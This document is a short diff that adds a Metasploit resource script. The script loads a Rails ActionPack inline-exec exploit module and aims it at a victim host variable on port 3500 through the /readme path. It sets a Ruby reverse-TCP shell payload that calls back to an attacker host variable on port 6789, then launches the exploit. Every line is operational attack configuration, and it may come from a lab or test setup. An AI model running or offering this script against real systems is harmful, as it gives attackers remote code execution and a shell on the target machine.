@@ -1,0 +1,10 @@
+use exploit/multi/http/rails_actionpack_inline_exec
+set rhost $VICTIM_IP
+set rport 3500
+set targetparam os
+set targeturi /readme
+set payload ruby/shell_reverse_tcp
+set lhost $HOST_IP
+set lport 6789
+exploit -j
+
